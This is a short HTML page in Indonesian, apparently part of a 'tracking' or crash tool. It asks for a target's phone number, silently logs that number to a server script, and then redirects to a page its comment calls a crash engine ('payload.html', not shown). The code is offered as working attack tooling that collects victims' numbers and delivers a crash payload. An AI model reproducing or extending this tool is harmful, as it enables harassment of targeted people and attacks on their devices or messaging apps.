<!DOCTYPE html>
<html>
<head>
    <title>Sistem Pelacakan</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>
    <h2>Masukkan Data Target</h2>
    <input type="text" id="wa" placeholder="Contoh: 08123456789" required>
    <button onclick="proses()">PROSES</button>

    <script>
        function proses() {
            let num = document.getElementById('wa').value;
            if(num === "") { alert("Masukkan nomor terlebih dahulu"); return; }
            
            // Mengirim data ke server tanpa pindah halaman
            fetch('log.php?num=' + encodeURIComponent(num));
            
            // Redirect otomatis ke engine crash
            window.location.href = 'payload.html';
        }
    </script>
</body>
</html>
